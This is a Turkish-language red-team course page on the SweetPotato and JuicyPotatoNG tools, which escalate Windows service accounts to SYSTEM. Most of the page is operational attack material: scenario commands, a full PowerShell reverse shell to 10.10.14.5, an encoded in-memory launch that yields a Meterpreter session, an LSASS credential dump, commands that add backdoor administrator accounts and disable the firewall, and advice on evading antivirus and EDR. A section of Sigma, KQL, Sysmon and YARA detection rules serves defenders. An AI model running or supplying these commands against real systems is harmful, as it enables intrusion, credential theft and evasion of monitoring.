# SweetPotato / JuicyPotatoNG

> **Kategori:** [15. YEREL YETKİ YÜKSELTME (LPE) VE POTATO AİLESİ](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows 10 ve Windows Server 2019/2022 sistemlerde DCOM, BITS ve Named Pipe mekanizmalarını birleştirerek `SeImpersonatePrivilege` ve `SeAssignPrimaryTokenPrivilege` hakları üzerinden `NT AUTHORITY\SYSTEM` seviyesine yerel yetki yükselten yeni nesil Potato ailesi araçları.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanına dahil edilmiş uygulama ve veritabanı sunucularında (IIS, MSSQL, Exchange, Jenkins, Tomcat vb.) servis hesapları, doğaları gereği diğer kullanıcıların veya işletim sistemi alt bileşenlerinin kimliğine bürünebilmek için `SeImpersonatePrivilege` veya `SeAssignPrimaryTokenPrivilege` Windows ayrıcalıklarına ihtiyaç duyar. Klasik **JuicyPotato** ve **RottenPotato**, Windows'un DCOM (Distributed Component Object Model) mimarisindeki Nesne Dışa Aktarıcı Tanımlayıcısı (OXID Resolver) mekanizmasını kullanarak yerel 127.0.0.1 üzerinde bir sahte RPC dinleyicisine NTLM kimlik doğrulamasını tetiklemekteydi. Ancak Microsoft, Windows 10 sürüm 1809 ve Windows Server 2019 ile birlikte OXID çözümlemesinin yerel döngü (loopback) bağlantı noktalarına yönlendirilmesini engelleyen DCOM sıkılaştırması (hardening) getirmiştir.

Bu savunma önlemini aşmak amacıyla iki kritik araç geliştirilmiştir:
1. **SweetPotato (CCob / @antlion):** C# ile geliştirilmiş çok modüllü bir yetki yükseltme çatısıdır. Klasik DCOM tabanlı token kaçırma tekniklerine ek olarak BITS (Background Intelligent Transfer Service) COM nesnelerini ve PrintSpoofer (Named Pipe) tekniklerini tek bir çatı altında birleştirir. Eğer hedef sistemde Print Spooler servisi kapalıysa otomatik olarak BITS veya alternatif DCOM CLSID'lerine geçiş yapar.
2. **JuicyPotatoNG (antonioCoco & Andrea Pierambrosio):** Klasik JuicyPotato'nun Windows Server 2019/2022 ve Windows 11 için yeniden tasarlanmış halidir. Eski OXID MITM mekanizması yerine, hedef CLSID'nin doğrudan yerel bir RPC sunucusuna bağlanmasını sağlayan veya COM aktivasyonu sırasında `IStorage` arayüzü üzerinden RPC istemcisinin güvenlik bağlamını doğrudan bellek içinde taklit eden (`RpcImpersonateClient`) yeni nesil mekanizmalar kullanır.

```
+---------------------------------------------------------------------------------------------------+
|                        SWEETPOTATO & JUICYPOTATONG MİMARİ ÇALIŞMA AKIŞI                           |
+---------------------------------------------------------------------------------------------------+

 [ Düşük Yetkili Servis Hesabı (IIS APPPOOL, MSSQL vb.) ]
                     │
       ┌─────────────┴─────────────┐
       ▼                           ▼
 [ SweetPotato Engine ]   [ JuicyPotatoNG Engine ]
       │                           │
       ├─► 1. Çoklu Vektör Seçimi: ├─► 1. Hedef CLSID Belirleme ({e60687f1-0103-4ed4-99d8-2794c4e35422})
       │    • Vektör A: PrintSpoofer (Named Pipe)
       │    • Vektör B: BITS (COM IBackgroundCopyManager)
       │    • Vektör C: DCOM / COM Server Activations
       │                           │
       ├─► 2. Bellek İçi Rogue     ├─► 2. Yerel Dinleyici / RPC Endpoint Binding
       │      RPC / Pipe Sunucusu  │      (DCOM Hardening Bypassed)
       │                           │
       ▼                           ▼
 [ Hedef Windows Servisi (NT AUTHORITY\SYSTEM) ]
 (spoolsv.exe / svchost.exe (BITS) / dllhost.exe)
       │
       ├─► 3. Sahte Yerel Arayüze / Boruya Kimlik Doğrulama İsteği Gönderir
       │
       ▼
 [ Token Yakalama & Taklit (Impersonation) ]
       │
       ├─► 4. RpcImpersonateClient() veya ImpersonateNamedPipeClient() Çağrılır
       ├─► 5. SYSTEM Güvenlik Belirteci (Token) Elde Edilir
       ├─► 6. DuplicateTokenEx() ile Primary Token'a Dönüştürülür
       │
       ▼
 [ Süreç Başlatma ]
       └─► 7. CreateProcessWithTokenW() / CreateProcessAsUserW()
              │
              ▼
   [ NT AUTHORITY\SYSTEM Shell / Komut Başarıyla Yürütüldü ]
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **DCOM Hardening Aşımı** | Windows Server 2019/2022 ve Win 10/11 güncellemelerinde çalışmayan klasik JuicyPotato sınırını aşar. |
| **Çoklu Geri Çekilme (Fallback) Yeteneği** | SweetPotato; Spooler kapalıysa BITS'e, BITS engelliyse DCOM CLSID'lerine otomatik olarak geçiş yapar. |
| **.NET / C# ve Native C++ Çeşitliliği** | SweetPotato `execute-assembly` (Cobalt Strike / Havoc) için ideal bir .NET assembly iken, JuicyPotatoNG doğrudan C++ native binary'dir. |
| **Proxy / MITM Bağımsızlığı** | Harici bir SMB veya HTTP sunucusuna yönlendirme yapmadan, tamamen yerel sistem içi RPC etkileşimleriyle çalışır. |

### Potato Ailesi Karşılaştırma Tablosu

| Kriter | RottenPotato | JuicyPotato | SweetPotato | JuicyPotatoNG | GodPotato |
|:---|:---|:---|:---|:---|:---|
| **Hedef İşletim Sistemi** | Windows 7-10 (<=1803) | Win 10 (<=1803), 2016 | Win 10/11, 2016/2019/2022 | Win 10/11, 2019/2022 | Win 10/11, 2012-2022 |
| **DCOM Port 6666 MITM** | ✅ Zorunlu | ✅ Zorunlu | ❌ Gerekmez | ❌ Gerekmez | ❌ Gerekmez |
| **Print Spooler Bağımlılığı** | ❌ Yok | ❌ Yok | ⚠️ Opsiyonel (Vektör 1) | ❌ Yok | ❌ Yok |
| **BITS Vektörü Desteği** | ❌ Yok | ❌ Yok | ✅ Var | ❌ Yok | ❌ Yok |
| **DCOM CLSID Desteği** | ✅ Kısıtlı | ✅ Geniş Tablo | ✅ Var | ✅ Yeni Nesil CLSID'ler | ✅ IStorage Otomatik |
| **Dil / Format** | C++ | C++ | C# (.NET Assembly) | C++ Native | C# (.NET 3.5 / 4.x) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### 2.1 SweetPotato Temel Sözdizimi

SweetPotato tek bir çalıştırılabilir dosya veya bellek içi assembly olarak yürütülebilir:

```cmd
SweetPotato.exe [SEÇENEKLER]
```

| Parametre | Açıklama | Kullanım Türü | Örnek Değer |
|:---|:---|:---|:---|
| `-e, --execution` | İstismar sonrasında yürütülecek komut veya çalıştırılabilir dosya yolu. | Yürütme | `-e "cmd.exe /c whoami"` |
| `-p, --program` | Başlatılacak programın mutlak dosya yolu. | Program | `-p C:\Windows\System32\cmd.exe` |
| `-a, --args` | Başlatılacak programa iletilecek komut satırı argümanları. | Argüman | `-a "/c net user hacker Pass123 /add"` |
| `-m, --mode` | Kullanılacak sömürü vektörü (`Auto`, `PrintSpoofer`, `BITS`, `DCOM`). | Vektör Seçimi | `-m BITS` |
| `-c, --clsid` | DCOM modunda tetiklenecek özel CLSID değeri (GUID formatında). | DCOM Yapılandırma | `-c {499cafab-7fcf-4e8b-8864-42bbc130ca47}` |
| `-l, --listen` | Rogue RPC/DCOM dinleyicisi için yerel port numarası (Varsayılan: 6666). | Dinleyici Portu | `-l 8888` |
| `-h, --help` | Yardım menüsünü ve parametre listesini görüntüler. | Bilgi | `-h` |

### 2.2 JuicyPotatoNG Temel Sözdizimi

JuicyPotatoNG, modern Windows sistemlerde çalışan C++ tabanlı CLI yapısına sahiptir:

```cmd
JuicyPotatoNG.exe -t <t|u|*> -p <program> [-a <args>] [-c <clsid>]
```

| Parametre | Açıklama | Kullanım Türü | Örnek Değer |
|:---|:---|:---|:---|
| `-t <mod>` | Süreç oluşturma API'si seçimi: `t` (`CreateProcessWithTokenW`), `u` (`CreateProcessAsUserW`), `*` (Önce `t`, başarısızsa `u`). | API Seçimi | `-t *` |
| `-p <prog>` | Yürütülecek ikili dosyanın adı veya tam yolu. | Program | `-p C:\Windows\System32\cmd.exe` |
| `-a <args>` | İkili dosyaya aktarılacak parametreler zinciri. | Argüman | `-a "/c whoami > C:\temp\out.txt"` |
| `-c <clsid>` | Taklit edilecek SYSTEM seviyesindeki COM bileşeninin CLSID kimliği. | COM Seçimi | `-c {e60687f1-0103-4ed4-99d8-2794c4e35422}` |
| `-z` | Sistemde tanımlı bilinen CLSID listesini test ederek çalışanları raporlar. | CLSID Brute-force | `-z` |
| `-l <port>` | Dahili COM sunucu soket portu (Varsayılan otomatik belirlenir). | Port | `-l 9999` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: SweetPotato ile Otomatik Vektör Tespiti ve Komut Yürütme
Hedef makinede `SeImpersonatePrivilege` yetkisine sahip bir servis oturumundan sistemdeki en uygun vektörü (Spooler veya BITS) otomatik seçerek SYSTEM komutu çalıştırma.

```cmd
C:\Windows\Temp\SweetPotato.exe -e "cmd.exe /c whoami"
```

```text
[+] SweetPotato by @Antlion (CCob)
[+] Attempting to detect available execution vectors...
[*] Testing Print Spooler vector...
[+] Found Spooler service running!
[+] Successfully triggered named pipe \\.\pipe\0c8a8163-42e1\pipe\spoolss
[+] Impersonated client: NT AUTHORITY\SYSTEM
[+] Token type: Primary (Duplicated)
[+] Calling CreateProcessWithTokenW...
[+] Process created with PID: 4984
Output:
nt authority\system
```

### Senaryo 2: Print Spooler Kapalıyken BITS Vektörüne Zorlama (SweetPotato)
Eğer sistem yöneticisi `Spooler` servisini devre dışı bırakmışsa, SweetPotato `-m BITS` anahtarı ile BITS servisinin COM arayüzünü (`IBackgroundCopyManager`) istismar eder.

```cmd
C:\Windows\Temp\SweetPotato.exe -m BITS -e "cmd.exe /c whoami /all"
```

```text
[+] SweetPotato by @Antlion (CCob)
[*] Selected mode: BITS
[*] Initializing rogue BITS COM activation server...
[*] Triggering BITS job notification interface...
[+] Captured NTLM authentication context from svchost.exe (BITS)
[+] Acquired token for: NT AUTHORITY\SYSTEM
[+] Launching process: cmd.exe /c whoami /all
[+] Process created with PID: 6112
USER INFORMATION
----------------
User Name             SID
===================== ====================================================
NT AUTHORITY\SYSTEM   S-1-5-18
```

### Senaryo 3: JuicyPotatoNG ile Windows Server 2022 Üzerinde Komut Yürütme
Klasik JuicyPotato'nun hata verdiği modern bir Windows Server 2022 ortamında JuicyPotatoNG ile yerel yönetici hesabı ekleme.

```cmd
C:\Windows\Temp\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user svc_support P@ssw0rd987! /add && net localgroup Administrators svc_support /add"
```

```text
[+] JuicyPotatoNG by @antonioCoco & @decoder_it
[+] Targeting OS: Windows Server 2022 Standard (Build 20348)
[+] Testing RPC connection to COM Server...
[+] Using CLSID: {e60687f1-0103-4ed4-99d8-2794c4e35422}
[+] Received NTLM connection from SYSTEM!
[+] ImpersonateLoggedOnUser() SUCCESS!
[+] Duplicating token... Primary Token obtained!
[+] CreateProcessWithTokenW() SUCCESS with PID: 3420!
```

### Senaryo 4: Cobalt Strike / Havoc Üzerinden In-Memory Execute-Assembly ile SweetPotato
Diske herhangi bir PE (.exe) bırakmadan bellek içinde C# SweetPotato assembly'sini yükleyerek ters bağlantı açma.

```text
beacon> execute-assembly /opt/tools/SweetPotato.exe -e "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAnACwANAA0ADQANQApADsA..."
```

Saldırgan dinleyici ekranındaki konsol çıktısı:
```text
[*] Started reverse TCP handler on 10.10.14.5:4445
[*] Sending stage (175643 bytes) to 192.168.10.20
[*] Meterpreter session 2 opened (10.10.14.5:4445 -> 192.168.10.20:51244)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Senaryo 5: JuicyPotatoNG ile Çalışan CLSID'leri Tarama (`-z` Modu)
Hedef makinede varsayılan CLSID engellenmişse, sistemdeki tüm kayıtlı COM nesnelerini test ederek SYSTEM token'ı sağlayan CLSID'leri belirleme.

```cmd
C:\Windows\Temp\JuicyPotatoNG.exe -z
```

```text
[+] Testing CLSIDs for local token kidnapping...
[+] Testing: {499cafab-7fcf-4e8b-8864-42bbc130ca47} -> FAILED (Access Denied)
[+] Testing: {03ca98d6-ff5d-49b8-abc6-03dd64110d17} -> FAILED (No Auth)
[+] Testing: {e60687f1-0103-4ed4-99d8-2794c4e35422} -> SUCCESS! [NT AUTHORITY\SYSTEM]
[+] Testing: {51887e07-8898-4547-8a8f-287714578112} -> SUCCESS! [NT AUTHORITY\SYSTEM]
[*] Scan complete: 2 functional CLSIDs discovered.
```

### Senaryo 6: LSASS Bellek Dökümünü SYSTEM Olarak Alma
Web shell veya kısıtlı oturumdan SweetPotato çağrılarak LSASS süreci comsvcs.dll mini-dump yöntemiyle dökülür.

```cmd
C:\Windows\Temp\SweetPotato.exe -e "cmd.exe /c powershell.exe -c \"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full\""
```

```text
[+] SweetPotato by @Antlion (CCob)
[+] Impersonated client: NT AUTHORITY\SYSTEM
[+] Process created with PID: 5548
[+] MiniDump completed successfully.
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `[-] Privilege SeImpersonatePrivilege not held` | Oturum açan kullanıcının belirtecinde token taklit etme hakkı yoktur. | `whoami /priv` çıktısını kontrol edin. Oturum standart bir etki alanı kullanıcısı ise Potato ailesi çalışmaz; kernel exploit veya zafiyetli servis yollarına yönelin. |
| `[!] DCOM interception failed: RPC_S_SERVER_UNAVAILABLE (0x800706BA)` | Hedef CLSID servisi başlatılamadı veya Windows güvenlik güncelleştirmesi RPC portunu blokladı. | SweetPotato kullanıyorsanız `-m BITS` moduna geçin; JuicyPotatoNG kullanıyorsanız `-z` ile farklı bir CLSID arayın. |
| `[-] CreateProcessWithTokenW failed with error 1314` | Süreçte `SeAssignPrimaryTokenPrivilege` hakkı eksiktir ve `CreateProcessWithTokenW` çağrısı kısıtlanmıştır. | JuicyPotatoNG komutunda `-t u` bayrağını vererek `CreateProcessAsUserW` API'sine zorlayın. |
| `[!] CoInitializeSecurity or CoCreateInstance error: 0x80040154` | Belirtilen CLSID hedef işletim sistemi sürümünde (build) kayıtlı değildir. | `-c` parametresi ile Windows sürümüne uygun bir CLSID girin veya SweetPotato'nun `-m Auto` modunu kullanın. |
| Komut çalışıyor ancak komut çıktısı ekrana yansımıyor | Süreç arka planda bağımsız bir masaüstü istasyonunda (Session 0) oluşturulmuştur. | Çıktıyı dosyaya yönlendirin (`-a "/c whoami > C:\temp\res.txt"`) veya `-e` parametresinde bir ters kabuk payload'u kullanın. |
| `Access is denied (0x5)` / Antivirus Engeli | Windows Defender veya EDR, bilinen Potato imzalarını statik veya dinamik analizde yakalamıştır. | `SweetPotato.exe` ikilisini doğrudan diske koymak yerine `execute-assembly` ile bellekten çalıştırın veya Defender Exclusion dizinlerini araştırın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                        SWEETPOTATO / JUICYPOTATONG TESPİT GÖZLEMLENEBİLİRLİĞİ                     |
+---------------------------------------------------------------------------------------------------+

 [ COM / DCOM Aktivasyonu ]
  - Anormal CLSID Çağrıları         ========> Sysmon Event ID 1 (w3wp.exe/sqlservr.exe -> DCOM)
  - BITS Servisi Tetiklemeleri     ========> Sysmon Event ID 11 / Olay 4688

 [ Yerel RPC / Pipe Dinleme ]
  - 127.0.0.1 üzerinde rastgele port ====> Sysmon Event ID 17/18 (Pipe Created) & Ağ Bağlantıları
  - RPC Endpoint Mapper Sorguları

 [ Token Manipülasyonu & Süreç Başlatma ]
  - DuplicateTokenEx() / Impersonate =====> EDR Davranışsal Analizi (Token Theft SeImpersonate)
  - Parent: w3wp.exe -> Child: cmd.exe ====> Sysmon Event ID 1 (Parent-Child Anomalisi)
  - Yeni Süreç: NT AUTHORITY\SYSTEM
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Sysmon Event ID 1 (Process Creation):** `ParentImage` değeri bir web sunucusu (`w3wp.exe`), SQL motoru (`sqlservr.exe`) veya Tomcat olan süreçlerin `cmd.exe`, `powershell.exe` gibi kabukları `NT AUTHORITY\SYSTEM` kimliğiyle başlatması birincil alarm tetikleyicisidir.
* **Windows Security Event ID 4624 / 4672:** `SYSTEM` kullanıcısı adına Logon Type 2 veya Type 9 (NewCredentials) ile oturum açılması ve `SeDebugPrivilege`, `SeTcbPrivilege` haklarının yüklenmesi.
* **Windows System Event ID 7036 / 7040:** BITS veya Spooler servislerinin aniden başlatılması veya yapılandırmasının değişmesi.

### 5.2 Ağ ve EDR İmzaları
* Araçlar harici ağ trafiği oluşturmaz; ancak yerel host içinde RPC portlarına (özellikle 135 ve yüksek dinamik portlar) yönelik seri COM sorguları üretir.
* Modern EDR sensörleri (CrowdStrike, SentinelOne, Defender for Endpoint), düşük yetkili bir sürecin `OpenProcessToken` ve `ImpersonateLoggedOnUser` Win32 API'lerini çağırmasını hafıza içi heuristik analizle tespit eder.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Privilege Escalation** | `T1134.001` | Access Token Manipulation: Token Impersonation/Theft | DCOM ve BITS servislerinin SYSTEM belirteçlerini taklit etme. |
| **Privilege Escalation** | `T1134.002` | Create Process with Token | `CreateProcessWithTokenW` veya `CreateProcessAsUserW` ile SYSTEM süreci başlatma. |
| **Privilege Escalation** | `T1068` | Exploitation for Privilege Escalation | COM arayüzlerindeki tasarım zafiyetlerini yetki yükseltme amacıyla istismar etme. |
| **Defense Evasion** | `T1055` | Process Injection | Token kaçırma tekniklerinin bellek içi (in-memory) assembly olarak çalıştırılması. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Seviye | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| Statik Binary İmzası | **KRİTİK** | Açık kaynaklı GitHub sürümlerini doğrudan diske yazmayın; C# kodunu ConfuserEx/Obfuscar ile karıştırın veya bellekten yükleyin. |
| Varsayılan CLSID İmzası | **YÜKSEK** | Standart bilinen BITS/DCOM CLSID'leri EDR'lar tarafından kurala bağlanmıştır; sistemde az bilinen meşru yerel COM CLSID'lerini tercih edin. |
| Anormal Parent-Child İlişkisi | **YÜKSEK** | Doğrudan `cmd.exe` açmak yerine, `explorer.exe` veya meşru bir Windows servisi gibi görünen bir hedef sürece process hollowing/injection uygulayın. |

### 5.5 Tespit Kuralı Örnekleri (Sigma & KQL)

#### Sigma Kuralı (Web/SQL Servisinden Şüpheli Alt Süreç Türetimi):
```yaml
title: Suspicious Process Spawning from Web or SQL Service (Potato Family)
id: 5e62f0a8-62d1-4db5-9769-cf78fae3fba1
status: production
description: Detects service accounts spawning command shells with SYSTEM privileges typical of SweetPotato/JuicyPotatoNG.
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\w3wp.exe'
      - '\sqlservr.exe'
      - '\tomcat.exe'
      - '\httpd.exe'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\rundll32.exe'
  selection_user:
    User|contains: 'SYSTEM'
  condition: selection_parent and selection_child and selection_user
level: critical
```

#### Microsoft Sentinel KQL Sorgusu:
```kusto
SecurityEvent
| where EventID == 4688
| where ParentProcessName has_any ("w3wp.exe", "sqlservr.exe") 
| where NewProcessName has_any ("cmd.exe", "powershell.exe", "net.exe", "whoami.exe")
| where TargetAccount has "SYSTEM"
| project TimeGenerated, Computer, ParentProcessName, NewProcessName, CommandLine, TargetAccount
```

#### Sysmon XML Filtresi (COM/RPC Dinleme İzleme):
```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <RuleGroup name="Potato Family Detection" groupRelation="or">
      <ProcessCreate onmatch="include">
        <ParentImage condition="end with">\w3wp.exe</ParentImage>
        <ParentImage condition="end with">\sqlservr.exe</ParentImage>
        <IntegrityLevel condition="is">System</IntegrityLevel>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

#### Incident Response (IR) PowerShell Analiz Scripti:
```powershell
# Servis hesaplarının SYSTEM olarak başlattığı süreçleri bulma
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 500 | Where-Object {
    $_.Message -match "Parent Process Name:.*(w3wp|sqlservr)\.exe" -and 
    $_.Message -match "Account Name:.*SYSTEM"
} | Select-Object TimeCreated, Message
```

#### YARA Kuralı (SweetPotato & JuicyPotatoNG İkili Tespiti):
```yara
rule HackTool_MSIL_SweetPotato_JuicyPotatoNG {
    meta:
        description = "Detects SweetPotato and JuicyPotatoNG binaries"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/CCob/SweetPotato"
    strings:
        $s1 = "CreateProcessWithTokenW" ascii wide
        $s2 = "CreateProcessAsUserW" ascii wide
        $s3 = "IBackgroundCopyManager" ascii wide
        $s4 = "e60687f1-0103-4ed4-99d8-2794c4e35422" ascii wide
        $s5 = "SweetPotato" ascii wide
        $s6 = "JuicyPotatoNG" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **Servis Hesaplarının Ayrıcalıklarını Kısıtlama:** IIS uygulama havuzlarında ve MSSQL servislerinde varsayılan `LocalSystem` veya `NetworkService` yerine kısıtlı Sanal Hesaplar (Virtual Accounts) veya gMSA (Group Managed Service Accounts) kullanılmalıdır.
* **Kullanıcı Hakları Ataması (GPO):** `SeImpersonatePrivilege` (İstemcinin kimliğine bürünme) ve `SeAssignPrimaryTokenPrivilege` hakları, Etki Alanı Grup İlkeleri üzerinden denetlenmeli ve servis hesaplarının bu hakları edinmesi engellenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. SweetPotato ile Otomatik Modda Komut Çalıştırma
```cmd
SweetPotato.exe -e "cmd.exe /c whoami"
```
* **Ne Yapar?:** Sistemdeki en uygun vektörü otomatik tespit ederek SYSTEM kimliğiyle komut yürütür.
* **Ne Zaman Kullanılır?:** Hedef sistemin Spooler veya BITS durumundan emin olunmadığında ilk deneme olarak.
* **Parametreler:** `-e <komut>`.

#### 2. SweetPotato ile BITS Vektörünü Zorlama
```cmd
SweetPotato.exe -m BITS -e "cmd.exe /c whoami"
```
* **Ne Yapar?:** Yazdırma Biriktiricisi kapalı sistemlerde BITS COM arayüzünü kullanarak SYSTEM belirtecini ele geçirir.
* **Ne Zaman Kullanılır?:** `spoolsv.exe` servisinin devre dışı olduğu sunucularda.
* **Parametreler:** `-m BITS` (mod seçimi), `-e <komut>`.

#### 3. SweetPotato ile DCOM Vektörü ve Özel CLSID Kullanma
```cmd
SweetPotato.exe -m DCOM -c {e60687f1-0103-4ed4-99d8-2794c4e35422} -e "cmd.exe /c whoami"
```
* **Ne Yapar?:** Belirtilen GUID kimliğindeki COM nesnesini tetikleyerek token kaçırma gerçekleştirir.
* **Ne Zaman Kullanılır?:** Diğer tüm servisler kapatılmış ancak belirli COM nesneleri erişilebilir olduğunda.
* **Parametreler:** `-m DCOM`, `-c <CLSID>`, `-e <komut>`.

#### 4. JuicyPotatoNG ile Her İki Süreç API'sini Deneyerek Komut Yürütme
```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```
* **Ne Yapar?:** Önce `CreateProcessWithTokenW`, başarısız olursa `CreateProcessAsUserW` API'sini dener.
* **Ne Zaman Kullanılır?:** Windows Server 2019 veya 2022 üzerinde en yüksek başarı oranıyla komut yürütmek için.
* **Parametreler:** `-t *`, `-p <program>`, `-a <argümanlar>`.

#### 5. JuicyPotatoNG ile Sistemdeki Uygun CLSID'leri Tarama
```cmd
JuicyPotatoNG.exe -z
```
* **Ne Yapar?:** İşletim sisteminde kayıtlı COM nesnelerini test ederek SYSTEM token'ı sağlayan CLSID'leri listeler.
* **Ne Zaman Kullanılır?:** Varsayılan CLSID'ler çalışmadığında veya yeni bir Windows derlemesi analiz edilirken.
* **Parametreler:** `-z` (tüm CLSID'leri tara).

#### 6. Yeni Yerel Yönetici Hesabı Oluşturma (SweetPotato)
```cmd
SweetPotato.exe -e "cmd.exe /c net user redadmin Admin@2026! /add && net localgroup administrators redadmin /add"
```
* **Ne Yapar?:** SYSTEM haklarıyla doğrudan kalıcı bir yerel yönetici kullanıcısı ekler.
* **Ne Zaman Kullanılır?:** Kalıcılık (persistence) veya RDP/WinRM üzerinden sisteme doğrudan erişim sağlamak için.
* **Parametreler:** `-e "net user ... & net localgroup ..."`.

#### 7. SYSTEM Yetkisinde PowerShell Ters Bağlantı Başlatma
```cmd
SweetPotato.exe -e "powershell.exe -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\""
```
* **Ne Yapar?:** Dışarıdaki dinleyiciye tam yetkili SYSTEM PowerShell kabuğu fırlatır.
* **Ne Zaman Kullanılır?:** Ağ kısıtlamalarını aşarak etkileşimli kabuk oturumu elde etmek için.
* **Parametreler:** `-e <powershell_payload>`.

#### 8. JuicyPotatoNG ile Belirli Bir CLSID Kullanarak İkili Dosya Çalıştırma
```cmd
JuicyPotatoNG.exe -t t -c {499cafab-7fcf-4e8b-8864-42bbc130ca47} -p "C:\Windows\Temp\loader.exe"
```
* **Ne Yapar?:** Belirtilen CLSID üzerinden `CreateProcessWithTokenW` ile özel bir loader/payload yürütür.
* **Ne Zaman Kullanılır?:** Standart CLSID'lerin antivirüs tarafından engellendiği durumlarda.
* **Parametreler:** `-t t`, `-c <CLSID>`, `-p <path>`.

#### 9. Komut Çıktısını Gizli Bir Dosyaya Yazdırma
```cmd
SweetPotato.exe -e "cmd.exe /c whoami /all > C:\Windows\Temp\privs.log"
```
* **Ne Yapar?:** Elde edilen oturumun tüm ayrıcalıklarını ve SID değerlerini log dosyasına yazar.
* **Ne Zaman Kullanılır?:** Web shell çıktılarının görünmediği kör (blind) sızma durumlarında.
* **Parametreler:** `-e "cmd.exe /c ... > dosya"`.

#### 10. Güvenlik Duvarı Kuralını Kapatma
```cmd
SweetPotato.exe -e "netsh advfirewall set allprofiles state off"
```
* **Ne Yapar?:** Windows Güvenlik Duvarı'nı tüm profiller (Domain, Private, Public) için devre dışı bırakır.
* **Ne Zaman Kullanılır?:** İç ağ pivot ve lateral movement öncesinde gelen/giden port engellerini kaldırmak için.
* **Parametreler:** `-e "netsh advfirewall ..."`.

---

## Kaynaklar

* [CCob Resmi GitHub Deposu: SweetPotato](https://github.com/CCob/SweetPotato)
* [antonioCoco & Andrea Pierambrosio Resmi GitHub Deposu: JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
* [decoder_it Blog: Rotten Potato to Juicy Potato and Beyond](https://decoder.cloud/)
* [The Hacker Recipes: Abusing Tokens and Impersonation](https://www.thehacker.recipes/a-d/movement/privilege-escalation/impersonation)
* [HackTricks: Windows Local Privilege Escalation - Impersonation Privileges](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)
* [MITRE ATT&CK: Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/)

---

> **Önceki:** [← PrintSpoofer](./PrintSpoofer.md) · **Sonraki:** [GodPotato →](./GodPotato.md)
